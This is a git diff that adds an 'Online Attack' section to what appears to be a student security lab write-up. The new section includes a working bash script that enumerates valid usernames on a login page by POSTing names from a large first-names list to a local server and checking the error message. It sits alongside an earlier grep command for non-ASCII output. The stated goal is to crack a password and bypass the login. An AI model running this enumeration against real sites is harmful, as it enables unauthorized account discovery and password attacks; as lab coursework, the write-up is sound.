@@ -104,7 +104,33 @@ if [ $? -eq 0 ]; then
 
 ```  echo $output | grep -P -n "[\x80-\xFF]" ``` -> Exit status of this command is 0 if non ASCII character were found
 
+<br> 
+## Part C - ONLINE ATTACK 
 
+Our goal is to get past the login page of the website below. We would need to find active usernames and crack password for one of the accounts. 
 
+[[Website]]
 
-## Part C
+I tried a random username and I get a following alert:
+
+[[website username not found]]
+
+I run the following script to find active usernames: 
+
+```
+cat facebook-firstnames.txt | head -n100000 |
+  while IFS= read -r uname
+  do
+    #echo $uname
+    output=`curl --data "username=$uname&password=123" localhost:5000/login 2>/dev/null | grep "Error. Username does not exist."`
+    if [ $? -eq 0 ]; then
+        continue
+    else
+        echo "$uname" >> "valid_usernames.txt"
+        echo $uname
+    fi
+  done
+```
+
+This script works by making a POST request to the server and if the response contains "Error. Username does not exist.", we can skip that username and look for other candidates
+
